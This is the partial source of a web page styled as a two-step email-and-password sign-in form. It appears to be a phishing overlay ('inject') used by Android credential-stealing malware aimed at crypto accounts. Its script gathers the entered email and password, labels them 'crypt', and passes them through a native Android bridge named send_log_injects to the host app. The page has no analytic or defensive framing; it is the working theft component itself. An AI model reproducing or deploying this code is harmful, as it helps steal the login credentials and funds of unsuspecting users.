    <style>
        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 15px;
            flex: 1;
        }

        footer {
            padding: 15px;
        }

        label {
            color: #373f50;
            font-size: 14px;
            font-weight: 500;
        }

        .input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dfe2ea;
            border-radius: 8px;
            font-weight: 300;
        }

        .input:focus {
            border-color: #306ae9;
        }

        ::placeholder {
            opacity: 1;
            color: #c4c4c5;
        }

        :-moz-placeholder {
            opacity: 1;
            color: #c4c4c5;
        }

        ::-moz-placeholder {
            opacity: 1;
            color: #c4c4c5;
        }

        :-ms-input-placeholder {
            opacity: 1;
            color: #c4c4c5;
        }

        ::-webkit-input-placeholder {
            opacity: 1;
            color: #c4c4c5;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            padding: 10px;
            color: #fff;
            background-color: #306ae9;
            border: 0;
            border-radius: 8px;
        }

        .button:disabled {
            opacity: 0.7;
        }

        .input:disabled {
            background-color: #dfe2ea;
            color: #000;
        }

        .error {
            border-color: #f00 !important;
        }
    </style>
</head>

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        var eye = document.getElementById('eye'),
            loginDublikat = document.getElementById('loginDublikat');

        login.onkeyup = () => {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error');
                nextPage.disabled = true;
            } else {
                login.classList.remove('error');
                nextPage.disabled = false;
            }
        }

        nextPage.onclick = () => {
            loginDublikat.value = login.value;

            form1.style.display = 'none';
            form2.style.display = 'flex';
        }

        password.onkeyup = () => {
            if(password.value.length >= 6) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.email = login.value;
                data.password = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text';
            } else {
                password.type = 'password';
            }
        }
    </script>
</body>
</html>
